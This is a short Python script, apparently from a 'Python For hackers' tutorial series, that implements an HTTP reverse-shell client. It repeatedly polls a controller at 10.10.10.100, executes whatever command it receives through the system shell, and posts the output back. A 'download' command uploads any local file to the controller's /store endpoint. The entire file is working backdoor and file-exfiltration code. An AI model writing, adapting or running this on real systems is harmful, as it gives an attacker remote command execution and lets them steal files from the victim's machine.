# Python For hackers - Priyank Gada
# www.youtube.com/priyankgada
# Data Grabbing Shell - HTTP - CLient

import requests 
import subprocess 
import os
import time


while True: 

    req = requests.get('http://10.10.10.100')
    command = req.text
        
    if 'terminate' in command:
        break 
#Defining the download command.


    elif 'download' in command:
        
        grab,path=command.split('*') 
        
        if os.path.exists(path): # Check for the file
            
            url = 'http://10.10.10.100/store'  
            files = {'file': open(path, 'rb')} 
            r = requests.post(url, files=files)
            
        else:
            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !' )
            
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read() )
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read() )

    time.sleep(3)
    



